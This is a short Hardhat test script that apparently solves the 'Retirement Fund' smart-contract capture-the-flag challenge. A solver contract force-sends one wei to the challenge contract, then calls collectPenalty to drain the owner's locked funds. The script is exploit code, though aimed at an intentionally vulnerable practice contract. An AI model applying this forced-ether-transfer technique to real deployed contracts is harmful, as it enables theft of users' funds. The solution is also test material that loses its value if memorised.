import { expect } from "chai"
import { ethers } from "hardhat"

describe("retirement-fund", function () {
  it("should steal owner's retirement fund", async function () {
    const chalAddr = ""
    const solAddr = ""

    const chalName = "RetirementFundChallenge"

    const sol = await ethers.getContractAt(`${chalName}Solver`, solAddr)
    const tx1 = await sol.transferForcibly(chalAddr, {value: 1})
    await tx1.wait()

    const chal = await ethers.getContractAt(chalName, chalAddr)
    const tx2 = await chal.collectPenalty()
    await tx2.wait()

    expect(await chal.isComplete()).to.be.true
  })
})